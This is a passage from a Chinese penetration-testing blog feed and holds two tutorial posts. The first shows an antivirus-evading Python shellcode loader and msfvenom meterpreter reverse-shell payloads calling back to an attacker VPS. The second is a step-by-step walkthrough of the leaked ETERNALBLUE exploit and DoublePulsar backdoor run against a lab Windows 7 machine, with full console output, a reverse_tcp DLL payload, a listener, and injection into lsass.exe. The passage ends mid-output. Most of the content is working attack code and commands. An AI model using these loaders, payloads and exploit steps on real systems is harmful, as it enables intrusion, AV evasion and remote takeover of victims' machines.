ctypes.c_int(0x3000),</div><div class="line">                                          ctypes.c_int(0x40))</div><div class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</div><div class="line">old = ctypes.c_long(1)</div><div class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))</div><div class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</div><div class="line">                                     buf,</div><div class="line">                                     ctypes.c_int(len(shellcode)))</div><div class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</div><div class="line">print &quot;Code By Luan&quot;</div><div class="line">shell()</div></pre></td></tr></table></figure></p>
<p>免杀来自<a href="http://lu4n.com/metasploit-payload-bypass-av-note/" target="_blank" rel="external">luan</a>。<br>再编译为exe</p>
<ul>
<li><a href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/" target="_blank" rel="external">pywin32</a></li>
<li><a href="https://nchc.dl.sourceforge.net/project/pyinstaller/2.0/pyinstaller-2.0.zip" target="_blank" rel="external">pyinstall</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python pyinstaller.py --console --onefile rcoil.py</div></pre></td></tr></table></figure>
</li>
</ul>
<p>或则直接生成exe，但是这样免杀效果就不好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@RcoIl:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=139.199.xxx.xxx LPORT=8888 -f exe &gt; /root/test.exe</div><div class="line">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</div><div class="line">No Arch selected, selecting Arch: x86 from the payload</div><div class="line">No encoder or badchars specified, outputting raw payload</div><div class="line">Payload size: 333 bytes</div><div class="line">Final size of exe file: 73802 bytes</div></pre></td></tr></table></figure></p>
<h2 id="内网msf连接vps"><a href="#内网msf连接vps" class="headerlink" title="内网msf连接vps"></a>内网msf连接vps</h2><p>选择：armitage-&gt;listeners-&gt;bind<br><img src="http://i2.muimg.com/567571/9f591ab4143834b8.png" alt=""><br>HOST写VPS的IP，PORT写6665,shell类型选择meterpreter<br>看图，发现已经链接上了。<br><img src="http://i1.piimg.com/567571/cf3829d5a52cc52b.png" alt=""></p>
<h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p><img src="http://i2.muimg.com/567571/3feade7e8310399b.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一直想搞一波事情&lt;br&gt;
    
    </summary>
    
      <category term="Tools" scheme="http://rcoil.me/categories/Tools/"/>
    
    
      <category term="Tools" scheme="http://rcoil.me/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>NSA工具包利用</title>
    <link href="http://rcoil.me/2017/04/NSA%E5%B7%A5%E5%85%B7%E5%8C%85%E5%88%A9%E7%94%A8/"/>
    <id>http://rcoil.me/2017/04/NSA工具包利用/</id>
    <published>2017-04-15T04:01:42.000Z</published>
    <updated>2017-08-24T14:35:31.368Z</updated>
    
    <content type="html"><![CDATA[<p>在4月14日下午5点shadowbroker公布了去年从方程式组织窃取的工具包</p>
<p>本次被公开的工具包大小为117.9MB，包含23个黑客工具。<br><a id="more"></a><br>解密后的工具包：<br><img src="http://i4.buimg.com/567571/31e383e451f5d8ac.png" alt=""></p>
<h1 id="方程式ETERNALBLUE复现"><a href="#方程式ETERNALBLUE复现" class="headerlink" title="方程式ETERNALBLUE复现"></a>方程式ETERNALBLUE复现</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><blockquote>
<p>攻击机：</p>
<blockquote>
<p>windows 7 Pro-64（192.168.1.4）<br>kali 2.0 （192.168.1.29）</p>
</blockquote>
<p>Python环境：<a href="https://www.python.org/download/releases/2.6.6/" target="_blank" rel="external">python-2.6.6</a><br>Python组件：<a href="https://sourceforge.net/projects ... ywin32/Build%20221/" target="_blank" rel="external">pywin32</a>(一定要使用32位的)<br>方程式ETERNALBLUE下载地址：<a href="https://codeload.github.com/misterch0c/shadowbroker/zip/master" target="_blank" rel="external">ETERNALBLUE</a><br>靶机：window 7 Pro-64（192.168.1.25）</p>
</blockquote>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><h3 id="综合各个信息"><a href="#综合各个信息" class="headerlink" title="综合各个信息"></a>综合各个信息</h3><p><img src="http://i2.muimg.com/567571/26f3f901545b313a.png" alt=""><br>将26、27、28三行注释掉<br><img src="http://i4.buimg.com/567571/53a0aac85b503073.png" alt=""><br>再将72行注释掉。<br>然后将fb运行起来<br><img src="http://i4.buimg.com/567571/343f7feb1cf7d2c0.png" alt=""><br>如果出现遍历目录的错误，是因为缺少listeningposts目录，在同级下创建一个listeningposts目录。</p>
<h3 id="开始进行配置"><a href="#开始进行配置" class="headerlink" title="开始进行配置"></a>开始进行配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">[?] Default Target IP Address [] : 192.168.1.25</div><div class="line"># 输入目标ip</div><div class="line">[?] Default Callback IP Address [] : 192.168.1.4</div><div class="line">#输入callback ip</div><div class="line">[?] Use Redirection [yes] : no</div><div class="line">#是否使用重定向</div><div class="line">[?] Base Log directory [D:\logs] :</div><div class="line">#日志文件的基础目录</div><div class="line">[*] Checking D:\logs for projects</div><div class="line">Index     Project</div><div class="line">-----     -------</div><div class="line">0         Create a New Project</div><div class="line"></div><div class="line">[?] Project [0] : 0</div><div class="line">#创建新项目。</div><div class="line">[?] New Project Name : test</div><div class="line">[?] Set target log directory to &apos;D:\logs\test\z192.168.1.25&apos;? [Yes] : yes</div><div class="line">#是否设置目标ip对应的日志文件目录在默认的下面</div><div class="line">[*] Initializing Global State</div><div class="line">[+] Set TargetIp =&gt; 192.168.1.25</div><div class="line">[+] Set CallbackIp =&gt; 192.168.1.4</div><div class="line"></div><div class="line">[!] Redirection OFF</div><div class="line">[+] Set LogDir =&gt; D:\logs\test\z192.168.1.25</div><div class="line">[+] Set Project =&gt; test</div><div class="line"></div><div class="line">fb &gt;</div><div class="line">#配置完成，进入fb命令行界面</div></pre></td></tr></table></figure>
<h3 id="使用use查看支持得插件模式"><a href="#使用use查看支持得插件模式" class="headerlink" title="使用use查看支持得插件模式"></a>使用<code>use</code>查看支持得插件模式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line">fb &gt; use</div><div class="line"></div><div class="line">Plugin Category: Touch</div><div class="line">======================</div><div class="line"></div><div class="line">  Name                     Version</div><div class="line">  ----                     -------</div><div class="line">  Architouch               1.0.0</div><div class="line">  Domaintouch              1.1.1</div><div class="line">  Eclipsedwingtouch        1.0.4</div><div class="line">  Educatedscholartouch     1.0.0</div><div class="line">  Emeraldthreadtouch       1.0.0</div><div class="line">  Erraticgophertouch       1.0.1</div><div class="line">  Esteemaudittouch         2.1.0</div><div class="line">  Explodingcantouch        1.2.1</div><div class="line">  Iistouch                 1.2.2</div><div class="line">  Namedpipetouch           2.0.0</div><div class="line">  Printjobdelete           1.0.0</div><div class="line">  Printjoblist             1.0.0</div><div class="line">  Rpctouch                 2.1.0</div><div class="line">  Smbtouch                 1.1.1</div><div class="line">  Webadmintouch            1.0.1</div><div class="line">  Worldclienttouch         1.0.1</div><div class="line"></div><div class="line"></div><div class="line">Plugin Category: ImplantConfig</div><div class="line">==============================</div><div class="line"></div><div class="line">  Name           Version</div><div class="line">  ----           -------</div><div class="line">  Darkpulsar     1.1.0</div><div class="line">  Mofconfig      1.0.0</div><div class="line"></div><div class="line"></div><div class="line">Plugin Category: Exploit</div><div class="line">========================</div><div class="line"></div><div class="line">  Name                   Version</div><div class="line">  ----                   -------</div><div class="line">  Easybee                1.0.1</div><div class="line">  Easypi                 3.1.0</div><div class="line">  Eclipsedwing           1.5.2  MS08-67漏洞利用工具</div><div class="line">  Educatedscholar        1.0.0  MS09-050漏洞利用工具</div><div class="line">  Emeraldthread          3.0.0  MB和 Netbios 漏洞利用工具，使用445端口和 139端口</div><div class="line">  Emphasismine           3.4.0  通过SMTP漏洞攻击，默认端口25</div><div class="line">  Englishmansdentist     1.2.0  通过SMTP漏洞攻击，默认端口25</div><div class="line">  Erraticgopher          1.0.1  通过RPC漏洞攻击，端口为445</div><div class="line">  Eskimoroll             1.1.1  通过kerberos漏洞进行攻击，默认攻击端口88</div><div class="line">  Esteemaudit            2.1.0  RDP漏洞利用工具，默认攻击端口为3389</div><div class="line">  Eternalromance         1.4.0  SMB 和 NBT漏洞利用工具，影响端口139和445</div><div class="line">  Eternalsynergy         1.0.1  SMB漏洞利用工具，默认端口 445</div><div class="line">  Ewokfrenzy             2.0.0</div><div class="line">  Explodingcan           2.0.2  IIS漏洞利用工具,只对Windows2003有影响</div><div class="line">  Zippybeer              1.0.2  SMTP漏洞利用工具，默认端口 445</div><div class="line"></div><div class="line"></div><div class="line">Plugin Category: Payload</div><div class="line">========================</div><div class="line"></div><div class="line">  Name              Version</div><div class="line">  ----              -------</div><div class="line">  Jobadd            1.1.1</div><div class="line">  Jobdelete         1.1.1</div><div class="line">  Joblist           1.1.1</div><div class="line">  Pcdlllauncher     2.3.1</div><div class="line">  Processlist       1.1.1</div><div class="line">  Regdelete         1.1.1</div><div class="line">  Regenum           1.1.1</div><div class="line">  Regread           1.1.1</div><div class="line">  Regwrite          1.1.1</div><div class="line">  Rpcproxy          1.0.1</div><div class="line">  Smbdelete         1.1.1</div><div class="line">  Smblist           1.1.1</div><div class="line">  Smbread           1.1.1</div><div class="line">  Smbwrite          1.1.1</div><div class="line"></div><div class="line"></div><div class="line">Plugin Category: Special</div><div class="line">========================</div><div class="line"></div><div class="line">  Name                Version</div><div class="line">  ----                -------</div><div class="line">  Eternalblue         2.2.0</div><div class="line">  Eternalchampion     2.0.0</div></pre></td></tr></table></figure>
<h3 id="选择Eternalblue插件"><a href="#选择Eternalblue插件" class="headerlink" title="选择Eternalblue插件"></a>选择<code>Eternalblue</code>插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div></pre></td><td class="code"><pre><div class="line">fb &gt; use Eternalblue</div><div class="line"></div><div class="line">[!] Entering Plugin Context :: Eternalblue</div><div class="line">[*] Applying Global Variables</div><div class="line">[+] Set NetworkTimeout =&gt; 60</div><div class="line">[+] Set TargetIp =&gt; 192.168.1.25</div><div class="line"></div><div class="line">[*] Applying Session Parameters</div><div class="line">[*] Running Exploit Touches</div><div class="line"></div><div class="line"></div><div class="line">[!] Enter Prompt Mode :: Eternalblue</div><div class="line"></div><div class="line">Module: Eternalblue</div><div class="line">===================</div><div class="line"></div><div class="line">Name                  Value</div><div class="line">----                  -----</div><div class="line">NetworkTimeout        60</div><div class="line">TargetIp              192.168.1.25</div><div class="line">TargetPort            445</div><div class="line">VerifyTarget          True</div><div class="line">VerifyBackdoor        True</div><div class="line">MaxExploitAttempts    3</div><div class="line">GroomAllocations      12</div><div class="line">Target                WIN72K8R2</div><div class="line"></div><div class="line">[!] plugin variables are valid</div><div class="line">[?] Prompt For Variable Settings? [Yes] :</div><div class="line">#是否确认可用参数，保持默认</div><div class="line">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 f</div><div class="line">or no timeout.</div><div class="line"></div><div class="line">[?] NetworkTimeout [60] :</div><div class="line">#设置超时时间，根据自身网络环境设置，时间长的就多设一些</div><div class="line">[*]  TargetIp :: Target IP Address</div><div class="line"></div><div class="line">[?] TargetIp [192.168.1.25] :</div><div class="line">#输入目标ip</div><div class="line">[*]  TargetPort :: Port used by the SMB service for exploit connection</div><div class="line"></div><div class="line">[?] TargetPort [445] :</div><div class="line">#输入目标端口</div><div class="line">[*]  VerifyTarget :: Validate the SMB string from target against the target sele</div><div class="line">cted before exploitation.</div><div class="line"></div><div class="line">[?] VerifyTarget [True] :</div><div class="line">#确认目标信息</div><div class="line">[*]  VerifyBackdoor :: Validate the presence of the DOUBLE PULSAR backdoor befor</div><div class="line">e throwing. This option must be enabled for multiple exploit attempts.</div><div class="line"></div><div class="line">[?] VerifyBackdoor [True] :</div><div class="line">#确认后台是否安装</div><div class="line">[*]  MaxExploitAttempts :: Number of times to attempt the exploit and groom. Dis</div><div class="line">abled for XP/2K3.</div><div class="line"></div><div class="line">[?] MaxExploitAttempts [3] :</div><div class="line">#设置最大尝试次数</div><div class="line">[*]  GroomAllocations :: Number of large SMBv2 buffers (Vista+) or SessionSetup</div><div class="line">allocations (XK/2K3) to do.</div><div class="line"></div><div class="line">[?] GroomAllocations [12] :</div><div class="line">#设置buffer，保持默认即可</div><div class="line">[*]  Target :: Operating System, Service Pack, and Architecture of target OS</div><div class="line"></div><div class="line">    0) XP            Windows XP 32-Bit All Service Packs</div><div class="line">   *1) WIN72K8R2     Windows 7 and 2008 R2 32-Bit and 64-Bit All Service Packs</div><div class="line"></div><div class="line">[?] Target [1] : 1</div><div class="line">#根据目标指纹而确定</div><div class="line">[!] Preparing to Execute Eternalblue</div><div class="line"></div><div class="line">[*]  Mode :: Delivery mechanism</div><div class="line"></div><div class="line">   *0) DANE     Forward deployment via DARINGNEOPHYTE</div><div class="line">    1) FB       Traditional deployment from within FUZZBUNCH</div><div class="line"></div><div class="line">[?] Mode [0] : 1</div><div class="line">[+] Run Mode: FB</div><div class="line">#设置攻击模式</div><div class="line">[?] This will execute locally like traditional Fuzzbunch plugins. Are you sure?</div><div class="line">(y/n) [Yes] : yes</div><div class="line">#是否确认使用本地的fuzzbunch插件，默认即可</div><div class="line">[*] Redirection OFF</div><div class="line"></div><div class="line">[+] Configure Plugin Local Tunnels</div><div class="line">[+] Local Tunnel - local-tunnel-1</div><div class="line">[?] Destination IP [192.168.1.25] :</div><div class="line">[?] Destination Port [445] :</div><div class="line">[+] (TCP) Local 192.168.1.25:445</div><div class="line">#确认目标信息</div><div class="line">[+] Configure Plugin Remote Tunnels</div><div class="line"></div><div class="line"></div><div class="line">Module: Eternalblue</div><div class="line">===================</div><div class="line"></div><div class="line">Name                  Value</div><div class="line">----                  -----</div><div class="line">DaveProxyPort         0</div><div class="line">NetworkTimeout        60</div><div class="line">TargetIp              192.168.1.25</div><div class="line">TargetPort            445</div><div class="line">VerifyTarget          True</div><div class="line">VerifyBackdoor        True</div><div class="line">MaxExploitAttempts    3</div><div class="line">GroomAllocations      12</div><div class="line">ShellcodeBuffer</div><div class="line">Target                WIN72K8R2</div><div class="line"></div><div class="line">[?] Execute Plugin? [Yes] :</div><div class="line">#确认执行插件</div><div class="line">[*] Executing Plugin</div><div class="line">[*] Connecting to target for exploitation.</div><div class="line">    [+] Connection established for exploitation.</div><div class="line">[*] Pinging backdoor...</div><div class="line">    [+] Backdoor not installed, game on.</div><div class="line">[*] Target OS selected valid for OS indicated by SMB reply</div><div class="line">[*] CORE raw buffer dump (28 bytes):</div><div class="line">0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</div><div class="line">0x00000010  73 69 6f 6e 61 6c 20 37 36 30 30 00              sional 7600.</div><div class="line">[*] Building exploit buffer</div><div class="line">[*] Sending all but last fragment of exploit packet</div><div class="line">    ................DONE.</div><div class="line">[*] Sending SMB Echo request</div><div class="line">[*] Good reply from SMB Echo request</div><div class="line">[*] Starting non-paged pool grooming</div><div class="line">    [+] Sending SMBv2 buffers</div><div class="line">        .............DONE.</div><div class="line">    [+] Sending large SMBv1 buffer..DONE.</div><div class="line">    [+] Sending final SMBv2 buffers......DONE.</div><div class="line">    [+] Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</div><div class="line">[*] Sending SMB Echo request</div><div class="line">[*] Good reply from SMB Echo request</div><div class="line">[*] Sending last fragment of exploit packet!</div><div class="line">    DONE.</div><div class="line">[*] Receiving response from exploit packet</div><div class="line">    [+] ETERNALBLUE overwrite completed successfully (0xC000000D)!</div><div class="line">[*] Sending egg to corrupted connection.</div><div class="line">[*] Triggering free of corrupted buffer.</div><div class="line">[*] Pinging backdoor...</div><div class="line">    [+] Backdoor returned code: 10 - Success!</div><div class="line">    [+] Ping returned Target architecture: x64 (64-bit)</div><div class="line">    [+] Backdoor installed</div><div class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</div><div class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</div><div class="line">=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</div><div class="line">[*] CORE sent serialized output blob (2 bytes):</div><div class="line">0x00000000  08 00                                            ..</div><div class="line">[*] Received output parameters from CORE</div><div class="line">[+] CORE terminated with status code 0x00000000</div><div class="line">[+] Eternalblue Succeeded</div><div class="line"></div><div class="line">fb Special (Eternalblue) &gt;</div></pre></td></tr></table></figure>
<h3 id="生成dll"><a href="#生成dll" class="headerlink" title="生成dll"></a>生成dll</h3><p>使用攻击机2 kali的msfvenom 生成一下dll劫持文件， 这里使用的是reverse_tcp的paylaod 可以根据网络情况采用其他payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@RcoIl:~/桌面# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.29 LPORT=1024 -f dll &gt; /root/桌面/test.dll</div><div class="line">No platform was selected, choosing Msf::Module::Platform::Windows from the payload</div><div class="line">No Arch selected, selecting Arch: x86_64 from the payload</div><div class="line">No encoder or badchars specified, outputting raw payload</div><div class="line">Payload size: 510 bytes</div><div class="line">Final size of dll file: 5120 bytes</div></pre></td></tr></table></figure></p>
<h3 id="启动msfconsole进行监听。"><a href="#启动msfconsole进行监听。" class="headerlink" title="启动msfconsole进行监听。"></a>启动msfconsole进行监听。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler </div><div class="line">msf exploit(handler) &gt; set lhost 192.168.1.29</div><div class="line">lhost =&gt; 192.168.1.29</div><div class="line">msf exploit(handler) &gt; set lport 1024</div><div class="line">lport =&gt; 1024</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">PAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(handler) &gt; exploit</div><div class="line"></div><div class="line">[*] Started reverse TCP handler on 192.168.1.29:1024 </div><div class="line">[*] Starting the payload handler...</div></pre></td></tr></table></figure>
<h3 id="使用doubelpulsar插件"><a href="#使用doubelpulsar插件" class="headerlink" title="使用doubelpulsar插件"></a>使用doubelpulsar插件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div></pre></td><td class="code"><pre><div class="line">fb Special (Eternalblue) &gt; use doublepulsar</div><div class="line"></div><div class="line">[!] Entering Plugin Context :: Doublepulsar</div><div class="line">[*] Applying Global Variables</div><div class="line">[+] Set NetworkTimeout =&gt; 60</div><div class="line">[+] Set TargetIp =&gt; 192.168.1.25</div><div class="line"></div><div class="line">[*] Applying Session Parameters</div><div class="line"></div><div class="line">[!] Enter Prompt Mode :: Doublepulsar</div><div class="line"></div><div class="line">Module: Doublepulsar</div><div class="line">====================</div><div class="line"></div><div class="line">Name              Value</div><div class="line">----              -----</div><div class="line">NetworkTimeout    60</div><div class="line">TargetIp          192.168.1.25</div><div class="line">TargetPort        445</div><div class="line">OutputFile</div><div class="line">Protocol          SMB</div><div class="line">Architecture      x86</div><div class="line">Function          OutputInstall</div><div class="line"></div><div class="line">[!] Plugin Variables are NOT Valid</div><div class="line">[?] Prompt For Variable Settings? [Yes] :</div><div class="line"></div><div class="line">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1</div><div class="line">for no timeout.</div><div class="line"></div><div class="line">[?] NetworkTimeout [60] :</div><div class="line"></div><div class="line">[*]  TargetIp :: Target IP Address</div><div class="line"></div><div class="line">[?] TargetIp [192.168.1.25] :</div><div class="line"></div><div class="line">[*]  TargetPort :: Port used by the Double Pulsar back door</div><div class="line"></div><div class="line">[?] TargetPort [445] :</div><div class="line"></div><div class="line">[*]  Protocol :: Protocol for the backdoor to speak</div><div class="line"></div><div class="line">   *0) SMB     Ring 0 SMB (TCP 445) backdoor</div><div class="line">    1) RDP     Ring 0 RDP (TCP 3389) backdoor</div><div class="line"></div><div class="line">[?] Protocol [0] :</div><div class="line"></div><div class="line">[*]  Architecture :: Architecture of the target OS</div><div class="line"></div><div class="line">   *0) x86     x86 32-bits</div><div class="line">    1) x64     x64 64-bits</div><div class="line"></div><div class="line">[?] Architecture [0] : 1</div><div class="line">[+] Set Architecture =&gt; x64</div><div class="line"></div><div class="line">[*]  Function :: Operation for backdoor to perform</div><div class="line"></div><div class="line">   *0) OutputInstall     Only output the install shellcode to a binary file on d</div><div class="line">isk.</div><div class="line">    1) Ping              Test for presence of backdoor</div><div class="line">    2) RunDLL            Use an APC to inject a DLL into a user mode process.</div><div class="line">    3) RunShellcode      Run raw shellcode</div><div class="line">    4) Uninstall         Remove&apos;s backdoor from system</div><div class="line"></div><div class="line">[?] Function [0] : 2</div><div class="line">[+] Set Function =&gt; RunDLL</div><div class="line"></div><div class="line">[*]  DllPayload :: DLL to inject into user mode</div><div class="line"></div><div class="line">[?] DllPayload [] : E:\test.dll</div><div class="line">[+] Set DllPayload =&gt; E:\test.dll</div><div class="line"></div><div class="line">[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call</div><div class="line"></div><div class="line"></div><div class="line">[?] DllOrdinal [1] :</div><div class="line"></div><div class="line">[*]  ProcessName :: Name of process to inject into</div><div class="line"></div><div class="line">[?] ProcessName [lsass.exe] :</div><div class="line"></div><div class="line">[*]  ProcessCommandLine :: Command line of process to inject into</div><div class="line"></div><div class="line">[?] ProcessCommandLine [] :</div><div class="line"></div><div class="line"></div><div class="line">[!] Preparing to Execute Doublepulsar</div><div class="line">[*] Redirection OFF</div><div class="line"></div><div class="line">[+] Configure Plugin Local Tunnels</div><div class="line">[+] Local Tunnel - local-tunnel-1</div><div 